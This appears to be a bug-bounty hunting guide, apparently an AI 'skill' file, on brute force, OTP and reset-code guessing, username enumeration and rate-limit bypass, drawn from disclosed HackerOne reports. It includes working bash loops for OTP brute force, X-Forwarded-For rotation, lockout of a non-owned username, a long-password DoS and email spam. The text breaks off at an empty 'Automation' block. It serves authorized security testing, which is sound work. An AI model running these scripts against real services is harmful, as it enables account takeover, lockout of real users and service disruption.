---
name: hunt-brute-force
description: "Hunting skill for missing/weak rate limiting, brute force and enumeration, built from 191 FULL disclosed HackerOne reports (228 assigned). Covers OTP/2FA/reset-code brute (6-digit = 10^6 keyspace → ATO), password-reset-token brute, login brute, credential stuffing, current-password-change brute, username/email enumeration (error-string / status-code / response-length / timing oracles), IP/header rotation bypass (X-Forwarded-For et al.), GraphQL quota underflow, attacker-triggered account lockout, mass-creation/notification abuse, low-entropy tokens and long-password/ReDoS resource exhaustion. Distinguishes four defense states (hard lockout vs soft IP throttle vs CAPTCHA injection vs silent shadow-throttle) so a naive 'no 429 = no rate limit' false negative is avoided. Severity Low→Critical by reachable impact (OTP→ATO = Critical)."
sources: hackerone_public
report_count: 228
full_reports_read: 191
---

## Crown Jewel Targets

Brute force / missing rate limiting is highest-value where the *thing being brute-forced* is a credential, a secret, or a security control. The study pack's frequency table is dominated by `brute-otp-reset` (173 of 191 full reports) and `dos-resource` (143) — these are the two centers of gravity. Prioritize targets in this order:

- **OTP / 2FA verification endpoints** — 6-digit codes = 1,000,000 combinations. With no effective throttle this is a direct MFA bypass → ATO. Grounded: Bitwarden email-2FA (#979820), Evernote 6-digit confirmation code during 2FA setup (#1394984), MTN OTP ATO (#761000), Smule OTP enumeration (#441161), Nextcloud user_oidc (`LoginController::code`, #1954711).
- **Password-reset / forgot-password token & code validation** — short, predictable, or non-rotating tokens + no rate limit → ATO. Grounded: DoD `PassReset.aspx` SSAN brute → PII + ATO (#2748003), DoD full ATO in forgot-password (#1059758), Instacart `reset_password_token` (#271533), Infogram (#280389), 4-digit reset token Maplogin (#64666).
- **Login / sign-in APIs (web AND mobile)** — brute + enumeration → credential stuffing with breach corpora. Grounded: Lichess login (#3085889), Palo Alto `api.outpost.co/api/v1/login` 33K requests (#766875), Instacart `/oauth/token` mobile endpoint bypassing web lockout (#160109), curl (#3030158), Stellar wp-admin (#342977).
- **Current-password re-entry fields** — password change, disable-2FA, delete-account, email-change "confirm your identity" flows. A session left on a shared machine + an unthrottled current-password field = ATO / MFA-disable. Grounded: Acronis (#827484), Reddit `/change_password` + `/prefs/update/` (#1170522, #1165285), Omise disable-2FA (#1465277), Reddit weak rate limit that accepts correct creds despite the error (#1065186).
- **Coupon / promo / invite / gift-card / bearer-token codes** — finite code space + no throttle → financial impact or free resources. Grounded: Uber promo x-uber-token enumeration (#293359), Uber 5-char invite codes 36^5 = 60,466,176 (#125200), Courier / stats-api token (#412526), Shopify promo-code redemption (#125707).
- **Resource-exhaustion endpoints (DoS class)** — long-password hashing, script loaders, mass creation of apps/albums/posts/leaderboards, mail/SMS bombing. Grounded: Nextcloud 1,000,000-char password hashing DoS (#840598, #952349), FormAssembly `load-scripts.php` (#690338), Weblate contact/email spam (#223542, #223557), Chaturbate album creation (#426547), WakaTime private leaderboards (#245527), DoD reset-password mail spam (#862681).
- **Any endpoint whose protection is annotated but not enforced** — the gap between "protection exists" and "protection throttles." Grounded: Nextcloud `@BruteForceProtection` middleware that never calls `throttle()` (#1596918), Nextcloud Memcached rate-limiter backend that is a no-op (#2110945), Shopify GraphQL cost bucket that never actually throttles `customerAccessTokenCreate` (#708013).

Payouts in the corpus range from $50 (Instacart reset-token brute, #271533) to $420 (xAI/MoPub IP-rotation, #819930) to $150 (Evernote 2FA email-verification brute, #1394984), with Critical severity assigned to login/OTP brute that reaches ATO (#3085889 CVSS 9.8, #766875, #3030158, #2748003). Severity tracks *what the brute reaches*, not the request count.

**Reading the frequency table as a hunt map.** The 191-report corpus is not evenly distributed: `brute-otp-reset` (173) and `dos-resource` (143) appear in the clear majority of reports, and the next tier — `api-endpoint` (69), `cookie-handling` (53), `comment-injection` (45), `session-attack` (43), `search-filter-sort` (41), `filter-bypass` (39), `server-side-rendering` (37) — shows that most findings are (a) code/token submissions, (b) API paths rather than the web form, and (c) a response differential that made the correct guess distinguishable. A productive session therefore does three things early: find the *code-checking* endpoint, find the *alternate API path* that skips the UI throttle, and find the *oracle* (length/status/timing/string) that says "you guessed right." The long tail (`public-code-search` 10, `graphql` 3, `host-header` 5, `time-based` 3, `error-based` 1) is smaller but disproportionately high-signal: these are the reports where the researcher read source, abused a quota, spoofed a source header, or built a timing/error oracle rather than just running Intruder.

**Do not stop at the obvious login form.** Reports repeatedly show the vulnerable surface was a *sibling* of the obvious one: the mobile endpoint rather than web (#160109), the API login rather than the page (#766875), the contact form rather than the auth flow (#1578121), the OIDC realm rather than the app login (#855304), or the token-validation step rather than the token-send step (#1987062). Recon that maps only `/login` will miss most of the corpus.

---

## Attack Surface Signals

### URL / Endpoint Patterns Seen in the Reports
```
/login                       /auth/post_login             /sign_in
/users_sign_in               /users/sign_in               /oauth/token
/api/v1/login                /web-client/api/user/login    /m/account/authenticate-email
/verify-otp                  /api/verify-otp              /2fa
/api/register                /signup                      /account/complete
/forgot_password             /users/forgot_password        /lostpassword/email
/reset-password-request/     /accounts/password/reset/     /password/reset/
/PKI/PassReset.aspx          /password/edit?reset_password_token=
/change_password             /prefs/update/               /settings/password
/api/public/contact/send     /contact/                    /help/linkedin/api/ticket/new
/report                      /statsapi/authtoken          /statsapi/?username=&token=
/invite/[code]               /rt/users/apply-clients-promotions
/api key regeneration        /sessions                    /apps/upload_app/
/photo_videos/photoset/create/                            /wp-admin /wp-login.php
/auth/realms/master/protocol/openid-connect/auth          /admin/apps/shopify-graphiql-app
```

### Parameter Names to Fuzz
```
username   email       password        current_password    old_password
otp        code        confirmationCode reset_password_token token
csrf       authenticity_token   session   PHPSESSID   identifier
x-uber-token   promo code   UUID   bearer token   payload (multipart)
```

### Response Signals (positive = oracle present)
```
429 / 403 / "Too Many Requests" / "Throttled." / "Login attempt limit exceeded"
"Username does not exist" vs "Password does not match username"   (#766875)
"No user account was found for the address given."                (#798913)
"Reset password token is invalid"                                 (#271533)
Body-length change on the correct code (e.g. response len 373)    (#1394984)
Status flip 400→200 (invalid vs valid OTP)                        (#979820)
X-RateLimit / X-Ratelimit headers revealing period+limit          (#1024880)
Set-Cookie session / JWT / redirect to dashboard on success
```

### Header / Source-Spoof Signals
```
X-Forwarded-For   X-Real-IP   X-Originating-IP   X-Client-IP
X-Remote-IP       X-Forwarded  Forwarded-For     CF-Connecting-IP
True-Client-IP    multiple comma-joined XFF values ("1.2.3.4, 5.6.7.8")
```
Grounded: Courier `X-Forwarded-For: 127.0.0.1` resets the limit (#1067533); Dashlane XFF bypass (#225897); Acronis `passport.acronis.work` XFF bypass (#2627062); LinkedIn Burp IP-Rotator contact-form bypass (#1578121).

### Tech-Stack Signals
- **ASP.NET WebForms** — `__EVENTTARGET` / `__VIEWSTATE` postback password reset (#2748003).
- **WordPress** — `wp-login.php`, `wp-admin`, XML-RPC brute-force amplification (#125624), `load-scripts.php` (#690338).
- **Nextcloud / PHP** — `@BruteForceProtection` annotations, `Memcached` rate-limiter backend (#1596918, #2110945, #1987062).
- **GraphQL** — cost-bucket APIs, `customerAccessTokenCreate`, negative `first:` arguments (#481518, #708013).
- **OIDC / Keycloak** — `auth/realms/master/protocol/openid-connect/auth` (#855304), `user_oidc` controllers (#1954711).
- **Mobile / OAuth** — a second login endpoint (`/oauth/token`) missing the web lockout (#160109).
- **Node/Express** — `X-Powered-By: Express` reset flows (#1065186).

### Success / Failure Oracle Cheat Sheet

The single most important recon output is an oracle: a measurable difference between a wrong guess and a right one. The corpus uses five oracle families.

| Oracle | What changes on success | Representative reports |
|--------|-------------------------|------------------------|
| **Status code** | `400` invalid → `200` valid; `401` → `200`/redirect | #979820, #160109, #412526 |
| **Body string** | "token is invalid" disappears; "wrong password" swaps | #271533, #766875, #798913, #681468 |
| **Body length** | one response uniquely shorter (e.g. ~373) | #1394984, #1465277, #244282 |
| **Timing** | valid user incurs a real password-hash delay | #5200, #903363 |
| **State transition** | session becomes authenticated; password actually changes; 2FA disabled | #827484, #1165285, #1059758, #1170522 |

Operational notes:
- Always capture a **failure baseline** first (one known-wrong guess), then diff against the candidate success. Without a baseline, "different" cannot be measured.
- For body-length oracles, Intruder's `length` column is often the whole finding — sort it, and the outlier IS the correct code (#1394984).
- For status oracles, watch for the throttle message that lies: Shopify returned "Login attempt limit exceeded" yet brute still worked (#708013); Reddit sent the brute error but accepted correct creds (#1065186). The error string is not proof a control exists.
- For state-transition oracles, use an account you own and verify the *downstream* effect (a real login, a real password change, a real 2FA disable) — an alleged "success" that does not change state is a false positive.

### High-Value Parameter Contexts

Some parameters are valuable precisely because they are not obvious "password" fields:

- `confirmationCode` — email verification while enabling 2FA (#1394984); a 6-digit code that gates account control.
- `reset_password_token` — the token itself is the secret (#271533); short numeric variants are tractable (#64666).
- `x-uber-token` / bearer tokens — enumerable at bandwidth speed when no rate limit exists (#293359).
- `promo` / invite codes — finite code spaces (36^5 ≈ 60M for 5 lowercase alphanumerics, #125200) with a distinguishable "gift from [First Name]" response.
- `statsapi` `token` — a correct token returns `200` (#412526).
- `identifier` — the key the limiter counts on; whitespace and `\n` appended here reset the counter (#1040471).
- `UUID` via Arjun param discovery — a hidden param exposed a `200 OK` on `/api/sessions` (#1069034).
- `csrf` / `authenticity_token` — deleting them can drop the request into an unthrottled code path (#3085889).

---

## Discovery Patterns From 191 Full Reports

### Where Researchers Start (ranked recon surfaces w/ "what to look for")

1. **The login / sign-in form itself** — the single most-mined surface. *What to look for:* capture the POST in Burp, send it to Intruder, check whether N wrong passwords ever produce 429/lockout/CAPTCHA. Look for CSRF/session token params that can simply be deleted (Lichess #3085889: "Modify the captured request by deleting the token parameter and the cookies"). Look for an error string that distinguishes "user does not exist" from "wrong password" (#766875).
2. **Forgot-password / password-reset flows** — 173 reports carry `brute-otp-reset` signal. *What to look for:* the reset *code/token submission* step (not just the "send email" step). Is the code numeric and short (4–6 digits)? Is the reset link identical on repeated requests (DoD #862681)? Is there a length-difference oracle on the correct token (#271533, #1394984)?
3. **OTP / 2FA verification endpoints** — *What to look for:* a pre-auth session pending verification; 6-digit fields; no delay/enforcement on `/verify-otp`. Check email-2FA, SMS-2FA, TOTP, and "verify email when enabling 2FA" (#1394984, #979820, #350288, #903363).
4. **Current-password re-entry dialogs** — *What to look for:* change-password, disable-2FA, change-email, delete-account, "confirm your identity" prompts. These are authenticated, so daily login throttles often do not apply (#827484, #1170522, #1165285, #1465277, #157750).
5. **Registration / signup / verification-code endpoints** — *What to look for:* email/SMS verification codes with no server-side check (#64666), and unthrottled signup enabling mass-account creation (#2915502).
6. **Notification / contact / report / mail-send functions** — *What to look for:* any form that sends email/SMS to a victim-controlled address; "alternative email" fields; report buttons tied to auto-delete thresholds (#1051734, #1185903, #1578121, #229511, #223542, #862681).
7. **Admin panels and default-app auth endpoints** — *What to look for:* `wp-admin`, exposed service admin on `0.0.0.0:7054` with `maxenrollments=-1` and "No limit to wrong password try" (#411364), basic-auth panels (#342977, #788420, #341074).
8. **Promo / invite / coupon / referral-code validators** — *What to look for:* short finite code spaces and a distinguishable valid/invalid response (#125200, #125707, #293359, #412526).
9. **High-volume creation endpoints** — *What to look for:* apps, albums, posts, leaderboards, bots, "add word," product requests — anything where 100 requests all return 200 (#416906, #426547, #1206004, #245527, #418151, #479021, #89178).
10. **GraphQL / cost-bucket APIs** — *What to look for:* per-app query-cost quotas, negative `first:` values, mutations that "fail to throttle login attempts" (#481518, #708013).
11. **Public source / annotations / open-source repos** — *What to look for:* `@BruteForceProtection` annotations that never call `throttle()`, missing-brute-force annotations on `LostController.php`, Memcached-as-ratelimiter code paths (#1596918, #1987062, #2110945, #292463).
12. **Mobile / alternate API clients** — *What to look for:* a mobile endpoint that lacks the web's lockout and can even log in a web-locked account (#160109, #855304).
13. **Code-verification during account creation / email change** — *What to look for:* a 4-digit verification code with "no rate limiting enable while checking the verification on server side" (#64666); or creating a new account with a pending email-change address to force a second confirmation link and confuse the flow (#1435392).
14. **Shared-resource / password-protected objects** — *What to look for:* password-protected shared files whose password can be brute-forced without a throttle (#1894653); API-key regeneration with "no request throttling or limit" (#243619).
15. **Anything that bills, stores, or notifies per request** — *What to look for:* plug-in/app creation that "occupies disk space and costing the company" (#1076047), bots started repeatedly (#418151), or contact forms that email a victim endlessly (#1708824, #1166069, #1166066).

**Where the initial names come from.** Several reports show the target list was harvested, not guessed: usernames are public via a user directory, leaderboard, or other public feature (#3160210); valid emails can be distinguished from invalid ones on a recovery page (#681468, #5200); and hidden parameters are found with Arjun before the brute begins (#1069034). A practical recon pass therefore collects three lists before sending a single guess: (1) valid identifiers, (2) the full set of sibling endpoints (web/API/mobile/admin), and (3) the rate-limit key (IP, username, session, or token) that the defense counts on. Knowing #3 is what makes the bypass section actionable — you cannot rotate a key you have not identified.

### Feature-Based Discovery Signals (frequency-ranked table w/ "why it matters / what to probe")

Frequencies are the count of full reports (of 191) containing each signal, verbatim from the study pack frequency table.

| Rank | Signal (reports) | Why it matters | What to probe |
|------|------------------|----------------|---------------|
| 1 | `brute-otp-reset` (173) | OTP/reset codes are the dominant ATO primitive; 10^6 keyspace | 101-code burst on `/verify-otp`; shadow-throttle seed; code rotation lifetime |
| 2 | `dos-resource` (143) | Missing throttle on expensive actions = CPU/memory/mail DoS | 1M-char password; 100× create/mail requests; `load-scripts.php` arrays |
| 3 | `api-endpoint` (69) | APIs often skip the web UI's CAPTCHA/throttle | Repeat POST to `/api/v1/login`, `/oauth/token`, `/statsapi/` |
| 4 | `cookie-handling` (53) | Session/cookie context is often the (only) limiter key | Delete token+cookies (#3085889); brute `PHPSESSID`/`token` (#244282) |
| 5 | `comment-injection` (45) | Report/spam features with no throttle become moderation武器 | Spam report button 10× to auto-delete a comment (#1051734) |
| 6 | `session-attack` (43) | Pre-auth / reset sessions gate the OTP step | Reuse/reset session; check whether code is bound to session |
| 7 | `search-filter-sort` (41) | Listing/filter endpoints leak valid identifiers | Enumerate valid accounts/codes via response differentials |
| 8 | `filter-bypass` (39) | Rate-limit filters are frequently bypassable | XFF rotation, whitespace/\n in identifier, negative GraphQL cost |
| 9 | `server-side-rendering` (37) | Render/redirect flows can expose verification state | Probe `/account/complete`, redirect-handling reset flows |
| 10 | `cache-layer` (31) | Cache backend can silently disable throttling | Memcached-backed limiter wipe (#2110945) |
| 11 | `image-processing` (29) | Heavy per-request processing amplifies DoS | Long password → hashing CPU/memory (#840598) |
| 12 | `admin-internal` (25) | Admin panels are traditional brute targets | `wp-admin`, exposed CA server, basic-auth panel |
| 13 | `json-body` (24) | JSON login APIs differ from form login; may lack throttle | Send `{"username":..,"password":..}` repeatedly |
| 14 | `subdomain-takeover` (23) / `proxy-feature` (23) / `csrf` (23) / `xml-parser` (23) | Alternate hosts/parsers often carry the unthrottled path | Test sibling subdomains, proxy-forwarded logins, XML-RPC amplification |
| 15 | `redirect-handling` (20) | Reset flows that redirect can expose valid/invalid state | Compare pre/post-redirect responses for valid vs invalid user |
| 16 | `url-fetching` (12) | Mail/notification delivery paths are unthrottled | Bomb a victim email via reset/contact endpoint |
| 17 | `fuzzing-enumeration` (11) | Enumeration is a first-class finding, not just a precursor | Valid vs invalid string/status/length/timing across ≥20 samples |
| 18 | `public-code-search` (10) | Source review reveals protection that is declared but inert | Grep `@BruteForceProtection`, `throttle()`, `LostController` |
| 19 | `sso-oauth` (9) | OIDC controllers often unthrottled | Probe `LoginController::code`, realm auth endpoints |
| 20 | `cors-misconfig` (8) / `auth-bypass` (7) | Cross-origin/auto auth can expose code-check endpoints | Enumerate OTP where no rate limit at check endpoint (#903363) |
| 21 | `js-source-review` (6) / `import-feature` (5) / `stack-fingerprinting` (5) | Client code / imports reveal hidden endpoints & params | Find PIN verification, UUID param via Arjun (#1069034) |
| 22 | `host-header` (5) | Client-controlled IP headers defeat per-IP limits | `X-Forwarded-For: 127.0.0.1` (#1067533, #225897) |
| 23 | `mutation-polyglot` (5) / `graphql` (3) | GraphQL mutations can bypass throttling | `customerAccessTokenCreate`, negative cost (#708013, #481518) |
| 24 | `time-based` (3) / `boolean-based` (3) / `error-based` (1) | Oracles encode validity in latency or errors | Timing median diff; error-string diff; boolean response diff |

### Verbatim Discovery Clues (18 real `[#id]` quotes)

- `[#3160210]` "I verified this by attempting to log into my own account from a different IP address using the correct password, and I was rate limited — confirming that the lockout mechanism is based solely on the username, not on the IP address or session context."
- `[#3085889]` "The valid username will match many incorrect password attempts before the correct password is found and the app will not even feel that or make any reaction"
- `[#819930]` "I sent out nearly 1,000 requests, and I was virtually banned on request about 120. But when I changed my IP and tried logging in, I was logged into the account without any additional checks"
- `[#1051734]` "I have found a no rate limit issue on the report functionality."
- `[#481518]` "Now Using the app I noticed by calling something like `first(-100)` will give you a negative cost"
- `[#1394984]` "when a user set ups his 2 Factor Authentication in his account and verify his email ,i was able to bruteforce the email verification process ."
- `[#1067533]` "I have found a technique that can easily bypass rate limit system of website and with this bug we attacker can easily attack into login panel, Sent unlimited number of huge notification to victim, bypass OTP codes and takeover account"
- `[#342977]` "in third anf forth screen i used burp intruder to automate bruit force attack (i tried only 9 times to make POC)"
- `[#280389]` "I tried sending 25 request which was success."
- `[#160109]` "As an example, I found a list of the most common 100 passwords and added my own password somewhere in the list."
- `[#1165285]` "I found when login and go to changing password, there is no rate limit on that function, which leads to takeover the account."
- `[#243619]` "I discovered that there is no request throttling or limit on api key regeneration."
- `[#350288]` "The researcher found a method to brute-force the 2FA code request in the www."
- `[#170310]` "I tried this on the /users/sign_in endpoint like I said and was successful for about ~50 login attempts before it just died and kept giving me a Precondition error each time"
- `[#903363]` "I was able to Bypass Authentication of any user by enumerating the One Time Password as there was no Rate Limiting at the Endpoint where the One Time Password was being checked."
- `[#1040471]` "While trying to bypass the rate limit, i tried adding spaces in the identifier parameter and to my surprise, that bypassed the rate limiting, i then dig deeper into it and i found out that the character \n also bypass it."
- `[#764122]` "I tried this on this /reset-password-request/ endpoint and like I said I was successful for sending ~100 and was even able to send like 100+ request to the user for password reset requests"
- `[#158157]` "Then I tried to brute force the login code with random numbers ( 5 digits, total possibility 100K )"

### Probe Checklist (15 concrete probes)

1. **Burst-50 login** — POST 50 wrong passwords; log `status`, `time_total`, `body length` per attempt. Classify into the four defense states below. (Targets: #3085889, #1285441 "1.5k+ requests", #272832.)
2. **Shadow-throttle seed** — plant the REAL current OTP for your own test account at a known position (e.g. 500) in a 600-code loop; if it stops authenticating under load, the endpoint is silently throttling — do NOT report "no rate limit."
3. **101-code OTP probe** — `seq -f "%06g" 0 100` against your own pending session; watch for 429/lockout. Note `seq 0 100` is 101 values.
4. **Enumeration oracle** — valid vs invalid user: diff error string, status, body length across ≥20 samples. (Targets: #766875, #681468, #5200.)
5. **Timing oracle** — median of 30 timings for valid vs invalid user; a reproducible hash-delay delta is a finding.
6. **Delete CSRF + cookies** — strip `token`/`csrf`/cookies from the login POST and retry the burst. (Target: #3085889.)
7. **Reset-link reuse** — request password reset twice; if the link/token is identical, it is non-rotating and bruteable. (Target: #862681.)
8. **Header rotation after 429** — rotate `X-Forwarded-For` (and siblings) every request; if the 429 disappears and returns when rotation is off, the per-IP limit is broken. (Targets: #819930, #225897, #2627062.)
9. **Localhost IP spoof** — `X-Forwarded-For: 127.0.0.1` .. `127.0.0.6`; does the limit reset? (Target: #1067533.)
10. **Identifier whitespace / newline** — append a space or `\n` to the rate-limit key parameter; does the counter reset? (Target: #1040471.)
11. **GraphQL negative cost** — exhaust the bucket with a high-cost query, then send `first:-1000` and a normal query; does the bucket refill? (Target: #481518.)
12. **Token entropy measurement** — collect 20 reset/session tokens for your own account; run Burp Sequencer / `ent`; check for counter/timestamp structure. (Targets: #271533, #64666.)
13. **Long-password DoS** — POST a 1,000,000-character password to login/signup; watch latency/CPU. (Targets: #840598, #952349.)
14. **Mass-creation burst** — 100× signup/apps/albums/posts/leaderboards/contact; confirm all return 200 with no 429/CAPTCHA. (Targets: #2915502, #416906, #426547, #245527.)
15. **Mobile/API endpoint fallback** — if web lockout triggers, replay the same creds against `/oauth/token` or the API login; a locked account that still authenticates is a bypass. (Target: #160109.)

---

## Step-by-Step Hunting Methodology

### CRITICAL: Four rate-limit states — do not collapse them

A `200`/`401` with no `429` does **not** mean "no rate limiting." Send a burst of ~50 requests and watch the *full* response (status, body, headers, latency, downstream success), then classify:

| State | Signal | Brute still feasible? |
|-------|--------|-----------------------|
| **Hard account lockout** | account disabled after N fails; later *correct* creds also fail | No (but lockout itself can be a DoS finding — #3160210) |
| **Soft IP throttle** | `429` / increasing latency keyed on source IP only | Yes — bypass via header/IP rotation (Phase 4) |
| **CAPTCHA injection** | `200` but body switches to a CAPTCHA challenge after N | Maybe — check if the verify endpoint enforces it server-side or if the API path skips it |
| **Silent shadow-throttle** | `200`/`401` for every request, but submissions are dropped — the genuinely-correct OTP/password stops being accepted, or responses become canned | **The trap.** A naive loop sees "all 200, no 429" and reports "no rate limit" — false. |

Shadow-throttle detector (inject a known-good value at a known position and confirm it still works under load):

```bash
# Seed: position 500 in the brute set is the REAL OTP for your own test account.
KNOWN_GOOD="123456"   # actual current OTP for YOUR test account
for n in $(seq 0 600); do
  CODE=$([ "$n" = "500" ] && echo "$KNOWN_GOOD" || printf "%06d" "$n")
  RESP=$(curl -s -o /tmp/bf_body -w "%{http_code} %{time_total}" \
    -X POST "https://$TARGET/api/verify-otp" \
    -H "Content-Type: application/json" -H "Cookie: $SESSION_COOKIE" \
    -d "{\"otp\":\"$CODE\"}")
  echo "$n $CODE $RESP $(wc -c </tmp/bf_body)"
done
# Rising time_total or a body-size change with status unchanged = shadow throttle.
```

### Phase 1 — Login rate limit test (classify, don't just count 429s)

```bash
for i in $(seq 1 50); do
  read CODE TIME < <(curl -s -o /tmp/bf_l -w "%{http_code} %{time_total}\n" \
    -X POST "https://$TARGET/api/login" -H "Content-Type: application/json" \
    -d "{\"username\":\"test@$TARGET\",\"password\":\"wrong$i\"}")
  echo "Attempt $i: status=$CODE time=${TIME}s len=$(wc -c </tmp/bf_l)"
  sleep 0.1
done
# status flips to 429/403 -> soft throttle or lockout
# body grows / CAPTCHA appears -> CAPTCHA injection
# latency climbs while status stays 401 -> shadow throttle
# nothing changes across all 50 -> candidate "no rate limit" (confirm with seed test)
```

### Phase 2 — OTP / 2FA brute force

```bash
# PRE-REQUISITE: a valid session pending OTP verification (your own test account).
SESSION_COOKIE="pre-auth-session-after-first-factor"

# PoC probe: 101 codes (seq 0..100 is INCLUSIVE = 101 values)
for CODE in $(seq -f "%06g" 0 100); do
  RESP=$(curl -s -X POST "https://$TARGET/api/verify-otp" \
    -H "Content-Type: application/json" -H "Cookie: $SESSION_COOKIE" \
    -d "{\"otp\":\"$CODE\"}" -o /dev/null -w "%{http_code}")
  echo "$CODE: $RESP"
  [ "$RESP" = "429" ] && { echo "Rate limit at $CODE"; break; }
done
# 101 clean attempts -> candidate only. Run the shadow-throttle seed before claiming anything.

# Full-keyspace impact proof (only with explicit authorization + your own account):
#   keyspace = 10^6 ; observed throughput from Phase 1 ; expected hit ~half keyspace.
#   50 req/s sustained -> ~10^6/50 ~= 5.5 h worst case, ~2.8 h expected. THAT is the impact.
#   If code rotates every T seconds, bound = (req/s * T) attempts per window.
#   Report the math; do NOT actually exhaust 10^6 against a third party.
```

### Phase 3 — Username / Email enumeration (string AND status AND timing)

```bash
VALID_USER="known-user@$TARGET"
INVALID_USER="definitely-not-real-xyz123@$TARGET"

# String + status diff
for U in "$VALID_USER" "$INVALID_USER"; do
  curl -s -o /tmp/bf_e -w "[$U] status=%{http_code} time=%{time_total}s len=%{size_download}\n" \
    -X POST "https://$TARGET/api/login" -H "Content-Type: application/json" \
    -d "{\"email\":\"$U\",\"password\":\"wrongpassword\"}"
done
# Target the exact string split seen in #766875:
#   "Username does not exist" vs "Password does not match username"

# Timing oracle — sample MANY times, compare medians (single request = noise)
for U in "$VALID_USER" "$INVALID_USER"; do
  echo "$U timings:"
  for i in $(seq 1 30); do curl -s -o /dev/null -w "%{time_total}\n" \
    -X POST "https://$TARGET/api/login" -H 'Content-Type: application/json' \
    -d "{\"email\":\"$U\",\"password\":\"wrong\"}"; done | sort -n | awk '{a[NR]=$1}END{print a[int(NR/2)]}'
done
# Reset + registration enumeration
curl -s -X POST "https://$TARGET/forgot-password" -d "email=$VALID_USER"   | grep -i "sent\|exist\|not found\|registered"
curl -s -X POST "https://$TARGET/api/register"   -d "email=$VALID_USER"    | grep -i "exist\|taken\|already"
# Caution: a generic "if this email exists we sent a link" message is NOT enumeration.
```

### Phase 3b — Unthrottled registration / mass creation (abuse finding on its own)

Burst `*/signup`, `*/apps/upload_app/`, `*/contact/`, `*/leaderboards`, `*/post` while rotating email/source; confirm N records are actually created with no 429/CAPTCHA/lockout → automated mass-account creation, spam, promo abuse, or resource exhaustion. Grounded: Weblate mass signup (#2915502), Chaturbate 500+ albums (#426547), WakaTime 300+ leaderboards (#245527), 100 posts at once (#1206004), adding infinite words (#479021).

### Phase 4 — IP / source rotation bypass

```bash
HEADERS=( "X-Forwarded-For" "X-Real-IP" "X-Originating-IP" "X-Client-IP" \
          "X-Remote-IP" "X-Forwarded" "Forwarded-For" "CF-Connecting-IP" "True-Client-IP" )
for i in $(seq 1 60); do
  RAND_IP="$(shuf -i 1-254 -n1).$(shuf -i 1-254 -n1).$(shuf -i 1-254 -n1).$(shuf -i 1-254 -n1)"
  ARGS=(); for h in "${HEADERS[@]}"; do ARGS+=(-H "$h: $RAND_IP"); done
  RESP=$(curl -s "${ARGS[@]}" -X POST "https://$TARGET/api/login" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"test@$TARGET\",\"password\":\"wrong$i\"}" -o /dev/null -w "%{http_code}")
  echo "Attempt $i (IP $RAND_IP): $RESP"
done
# Also: comma-joined XFF ("1.2.3.4, 5.6.7.8"); append your real IP AFTER a spoofed one.
# CONFIRM: re-run Phase 1 WITHOUT rotation to show the 429 returns. The delta is the proof.
# Or use Burp IP Rotator extension (#1578121) / change IP after ~120 tries (#819930).
```

### Phase 5 — Token entropy (measure it, don't eyeball it)

```bash
for i in $(seq 1 20); do
  curl -s -X POST "https://$TARGET/forgot-password" -d "email=your-test@email.com"
  # extract token from email/link -> tokens.txt ; sleep 2
done
ent tokens.txt 2>/dev/null || python3 -c "import sys,math,collections;d=open('tokens.txt').read();c=collections.Counter(d);n=len(d);print('bits/char =', -sum(v/n*math.log2(v/n) for v in c.values()))"
sort -n tokens.txt | awk 'NR>1{print $1-prev} {prev=$1}'   # small constant delta = counter-based
# DEFINITIVE: pipe ~10k tokens through Burp Sequencer (FIPS/NIST) — <~64 effective bits = finding.
# Short numeric tokens seen: 4-digit (#64666), 5-digit 100K (#158157), 6-digit (#1394984).
```

### Phase 6 — ReDoS / long-input resource exhaustion

```bash
# Catastrophic-backtracking regex trigger
for LEN in 5 10 15 20 25 30; do
  INPUT=$(python3 -c "print('a'*$LEN + '!')")
  T=$(curl -s -o /dev/null -w "%{time_total}" "https://$TARGET/search?q=$INPUT")
  echo "len=$LEN -> ${T}s"
done
# Long-password hashing DoS (#840598/#952349):
curl -s -o /dev/null -w "%{time_total}\n" -X POST "https://$TARGET/signup" \
  -d "email=x@x.com&password=$(python3 -c 'print("a"*1000000)')"
# Doubling latency per +5 chars (super-linear) = ReDoS. Linear = just a slow endpoint.
# Control: same byte-length BENIGN string; if fast, blow-up is regex/hashing-driven.
```

### Phase 7 — Attacker-triggered lockout (account DoS)

A throttle can be a vulnerability when it is keyed to the *victim* rather than the attacker. Lichess (#3160210) proved the lockout was "based solely on the username," so guessing a public username 5–10 times disabled that account. To test:

```bash
# 1. Pick a username you do NOT own (from a directory/leaderboard, #3160210).
# 2. Send 5-10 failed logins for THAT user from your own IP.
for i in $(seq 1 10); do
  curl -s -X POST "https://$TARGET/login" -d "username=$VICTIM&password=wrong$i" \
    -w "attempt=$i status=%{http_code}\n" -o /dev/null
done
# 3. From a DIFFERENT IP, try the victim's correct creds (if you can, use your own
#    account as the "victim" to stay authorized) and confirm a correct password is
#    now refused. #3160210: logging in from a different IP with the correct password
#    was STILL rate limited -> the key is the username, not the source.
# 4. Severity = Medium (targeted account DoS). Also note #1065186: the reverse bug,
#    where the lockout message appears but correct creds STILL work.
```

### Phase 8 — Notification / mail-SMS / mass-creation abuse

When the unthrottled endpoint sends mail or creates objects, the impact is abuse rather than ATO. Grounded: DoD reset mail spam (#862681), Medium "sifchain-finance" email auth spam (#1185903), LinkedIn contact-form spam via IP rotator (#1578121), WakaTime 300+ private leaderboards (#245527), Chaturbate 500+ albums (#426547), Weblate contact/email spam (#223542, #223557), 100+ password-reset requests to one user (#764122, #1331268).

```bash
# Confirm SIDE EFFECTS, not just 200s:
#  - count emails actually delivered to a mailbox you control
#  - count DB objects actually created (list endpoint before/after)
#  - confirm the victim gets no notification (#149598: "a victim and admin get no
#    notification / impact on service")
for i in $(seq 1 100); do
  curl -s -X POST "https://$TARGET/contact" -d "email=victim@yourmail.com&msg=test$i" \
    -w "req=$i status=%{http_code}\n" -o /dev/null
done
# Rotate source/recipient if a soft throttle appears (see Phase 4).
```

### Decision tree: is this a real finding?

```
Did the burst change status/body/latency at all?
├─ YES, hard lockout after N fails
│   └─ Can an attacker trigger it for a victim? -> account DoS (Medium)  [#3160210]
│   └─ Does a correct password still work despite the message? -> weak throttle (Low) [#1065186]
├─ YES, 429 / CAPTCHA / rising latency
│   └─ Bypass with header/IP rotation? -> per-IP limit defeated (High) [#819930][#1067533]
│   └─ CAPTCHA path skippable via API/token removal? -> brute continues (High) [#3085889]
├─ NO visible change — all 200/401
│   └─ Shadow-throttle seed test: does the REAL code still work at position 500?
│       ├─ NO  -> silently throttled; NOT a finding (avoid false positive)
│       └─ YES -> genuine no-rate-limit candidate; continue
│                   ├─ Is there a success oracle? -> enumerate / brute
│                   └─ Is it a code/token with a finite keyspace? -> reachability math
```

### Automation

```bash
